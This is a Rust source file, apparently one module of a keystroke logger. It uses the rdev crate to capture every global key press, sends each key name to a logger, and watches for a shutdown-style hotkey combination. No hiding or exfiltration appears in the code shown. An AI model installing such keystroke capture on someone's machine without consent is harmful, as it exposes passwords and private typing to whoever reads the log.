use std::sync::atomic::{AtomicU8, Ordering};
use std::sync::Arc;
use std::io::Error;

use rdev::{Event, EventType, Key};

use crate::listener::logic::hotkey::HotKey;
use logger::Logger;

mod hotkey;
mod logger;


#[derive(Clone)]  // auto copy/clone
pub struct Logic {
    logger: Logger
}

impl Logic {
// ##### PUBLIC AREA #####
    pub fn shoutdown(&self) {
        self.logger.shoutdown();
        println!("[logic]: Logger shoutdown");
    }

    // add key to the log list
    pub fn logger_start(&self) -> Result<String, Error> {
        return self.logger.start();
    }

    pub fn log_key(&self, event: Event) {

        // !!!
        // error: down't support no-English literals

        // get a pressed key name and after send it to the logger
        match event.event_type {
            EventType::KeyPress(key) => {
                let key_name = format!("{:?}", key);
                self.logger.log_key(key_name.as_str());
            }
            _ => () // do nothing
        }
    }

    // key printer
    pub fn print_key_in_console(&self, key: Option<String>) {
        match key {
            Some(key) => println!("{}", key),
            None => (),
        };
    }

    // processes the keys state changes
    pub fn process_event(&self, event: EventType, signal_ptr: Arc<AtomicU8>) {

        // lamda func: check does the key is a hotkey component
        let as_hotkey_component = move |key: Key| -> HotKey {
            let component: HotKey;
            match key {
                Key::Escape      => component = HotKey::Escape,
                Key::ControlLeft => component = HotKey::ControlLeft,
                Key::ShiftLeft   => component = HotKey::ShiftLeft,
                Key::KeyQ        => component = HotKey::KeyQ,
                Key::KeyC        => component = HotKey::KeyC,
                // default
                _ => component = HotKey::NoComponent,
            }
            return component;
        };

        // find event type
        match event {
            EventType::KeyPress(key) => {
                let comp: HotKey = as_hotkey_component(key);
                if comp != HotKey::NoComponent {
                    comp.press_key();

                    // send signal
                    let new_signal = HotKey::get_hotkey_signal().as_num();
                    signal_ptr.store(new_signal, Ordering::Relaxed);
                }
            },
            EventType::KeyRelease(key) => {
                let comp: HotKey = as_hotkey_component(key);
                if comp != HotKey::NoComponent {
                    comp.release_key();
                }
            },
            _ => ()
        }

        // # Note: 
        // Signal reset only after Listener::signal_analyzer
        // processed it
        
    }

    // constructor
    pub fn new() -> Logic {
        Logic {
            logger: Logger::new()
        }
    }
}